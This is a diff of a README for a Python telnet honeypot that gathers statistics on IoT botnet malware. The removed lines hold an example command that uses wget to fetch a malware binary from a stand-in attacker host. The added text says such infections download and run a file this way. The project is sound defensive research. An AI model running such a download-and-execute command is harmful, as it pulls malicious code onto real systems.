@@ -6,9 +6,13 @@ This project implements a python telnet server trying to act
 as a honeypot for IoT Malware which spreads over horribly
 insecure default passwords on telnet servers on the internet.
 
-The script tries to identify download commands
-like `wget http://haxx0r.net/malware.bin`, extracts the URLs
-and tries to download and indentify the malware-binaries.
+Other than https://github.com/stamparm/hontel or https://github.com/micheloosterhof/cowrie (examples),
+which provides full (via chroot) or simulated behaviour of a linux
+system this honeypots goal is just to collect statistics of (IoT) botnets.
+This means that the honeypot must be made to work with every form of automated telnet session,
+which may try to infect the honeypot with malware.
+Luckily, these malwares infection processes are quite simple,
+just using wget do download something and running it.
 
 Statistics of the downloaded binaries and corresponding
 Urls/Telnet connections may be created via the generated
